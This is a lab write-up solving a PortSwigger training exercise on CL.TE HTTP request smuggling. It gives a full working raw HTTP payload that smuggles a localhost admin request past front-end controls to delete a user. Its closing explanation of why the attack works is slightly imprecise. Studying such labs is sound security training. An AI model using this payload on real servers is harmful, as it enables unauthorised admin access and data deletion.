# Lab 08 — Exploiting HTTP request smuggling to bypass front-end security controls (CL.TE)

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te)

**Entry point:** `/admin` is blocked by the front-end — smuggle it past.
Access control quirk: the back-end requires `Host: localhost`, and a second
Host header conflicts — so embed the admin request **in a body**.

## Solution

Final working smuggle (send twice):

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

(Content-Length counts the embedded request; 116 for the read-only
`GET /admin` probe.)

The front-end discards the body; the back-end executes the embedded
localhost request — carlos is deleted — lab solved.
